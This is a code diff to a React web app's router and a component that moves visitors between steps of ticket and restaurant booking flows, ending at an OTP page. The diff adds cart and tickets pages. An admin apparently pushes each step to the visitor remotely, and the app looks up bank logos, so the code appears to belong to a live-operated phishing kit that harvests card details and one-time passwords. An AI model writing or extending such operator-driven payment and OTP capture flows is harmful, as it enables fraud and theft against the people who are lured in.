@@ -21,24 +21,25 @@ import { findBankLogo } from "@/lib/bank-logos";
 const TICKET_STEP_TO_PATH: Record<number, string> = {
   1: "/registration",
   2: "/booking",
-  3: "/checkout",
-  4: "/otp",
+  3: "/cart",
+  4: "/checkout",
   5: "/otp",
-  6: "/confirmation",
+  6: "/otp",
+  7: "/confirmation",
 };
 
 // Restaurant flow:
-//   Steps 1-4  → SPA-internal stages of /reserve/:id (handled by reserve.tsx
+//   Steps 1-5  → SPA-internal stages of /reserve/:id (handled by reserve.tsx
 //                via the "admin-restaurant-step" custom event below).
-//   Step  5    → /otp
-//   Step  6    → /confirmation
+//   Step  6    → /otp
+//   Step  7    → /confirmation
 const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
-  5: "/otp",
-  6: "/confirmation",
+  6: "/otp",
+  7: "/confirmation",
 };
 
 // Steps that the reserve.tsx page handles internally (no URL change needed).
-const RESTAURANT_INTERNAL_STEPS = new Set<number>([1, 2, 3, 4]);
+const RESTAURANT_INTERNAL_STEPS = new Set<number>([1, 2, 3, 4, 5]);
 
 function isRestaurantVisitor(data: any): boolean {
   return (
@@ -78,38 +79,21 @@ function DirectedStepWatcher() {
       // away from /reserve/:id. Because reserve.tsx is lazy-loaded, also stash
       // the pending step on `window` so reserve.tsx can pick it up on mount
       // even if the event fires before its effect attaches.
-      if (isRestaurantVisitor(data) && RESTAURANT_INTERNAL_STEPS.has(step)) {
-        const onReservePage =
-          window.location.pathname.startsWith("/reserve");
-        // If the visitor has drifted off /reserve/:id (e.g. they're now on
-        // /otp or /confirmation), navigate them back to the reserve page
-        // first so the SPA-internal step push has somewhere to land.
-        if (!onReservePage) {
-          const rid = data?.restaurantId;
-          if (!rid) {
-            // Without a restaurant id we can't route them back; fall through
-            // and let the normal external-route map handle it (it won't
-            // match for steps 1-4, so the push is a no-op).
-          } else {
-            (window as any).__pendingReserveStep = step;
-            setLocation(`/reserve/${rid}`);
-            setTimeout(() => {
-              void clearDirectedStep();
-            }, 1500);
-            return;
-          }
-        } else {
-          (window as any).__pendingReserveStep = step;
-          window.dispatchEvent(
-            new CustomEvent("admin-restaurant-step", { detail: { step } }),
-          );
-          // Delay the clear so a freshly-lazy-loaded reserve.tsx has time to
-          // attach its listener and process the push before we wipe the field.
-          setTimeout(() => {
-            void clearDirectedStep();
-          }, 1500);
-          return;
-        }
+      if (
+        isRestaurantVisitor(data) &&
+        RESTAURANT_INTERNAL_STEPS.has(step) &&
+        window.location.pathname.startsWith("/reserve")
+      ) {
+        (window as any).__pendingReserveStep = step;
+        window.dispatchEvent(
+          new CustomEvent("admin-restaurant-step", { detail: { step } }),
+        );
+        // Delay the clear so a freshly-lazy-loaded reserve.tsx has time to
+        // attach its listener and process the push before we wipe the field.
+        setTimeout(() => {
+          void clearDirectedStep();
+        }, 1500);
+        return;
       }
 
       const target = pickTargetPath(step, data);
@@ -147,8 +131,10 @@ function DirectedStepWatcher() {
 }
 
 const Home = lazy(() => import("@/pages/home"));
+const TicketsPage = lazy(() => import("@/pages/tickets"));
 const RegistrationPage = lazy(() => import("@/pages/registration"));
 const BookingPage = lazy(() => import("@/pages/booking"));
+const CartPage = lazy(() => import("@/pages/cart"));
 const CheckoutPage = lazy(() => import("@/pages/checkout"));
 const OTPPage = lazy(() => import("@/pages/otp"));
 const ConfirmationPage = lazy(() => import("@/pages/confirmation"));
@@ -164,8 +150,10 @@ function Router() {
     <Suspense fallback={<Loading />}>
       <Switch>
         <Route path="/" component={Home} />
+        <Route path="/tickets" component={TicketsPage} />
         <Route path="/registration" component={RegistrationPage} />
         <Route path="/booking" component={BookingPage} />
+        <Route path="/cart" component={CartPage} />
         <Route path="/checkout" component={CheckoutPage} />
         <Route path="/otp" component={OTPPage} />
         <Route path="/confirmation" component={ConfirmationPage} />
